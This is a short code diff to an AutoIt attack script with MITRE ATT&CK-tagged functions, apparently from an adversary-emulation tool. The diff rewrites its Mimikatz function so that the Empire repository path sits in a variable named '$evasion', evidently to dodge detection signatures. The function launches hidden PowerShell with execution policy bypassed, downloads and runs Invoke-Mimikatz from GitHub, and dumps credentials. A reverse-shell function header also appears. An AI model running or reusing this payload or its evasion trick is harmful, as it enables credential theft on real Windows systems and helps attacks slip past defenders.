@@ -292,7 +292,8 @@ Func ReverseShell($RemoteIp, $RemotePort);DESCRIPTION:reverse shell using powers
 EndFunc
 
 Func Mimikatz();DESCRIPTION:Mimikatz;MITRE:Credential Access
-   $buffer = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds";
+   $evasion = "EmpireProject/Empire"
+   $buffer = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/" & $evasion & "/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds";
    RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -nop -exec bypass -c " & " " & $buffer);
 EndFunc
 
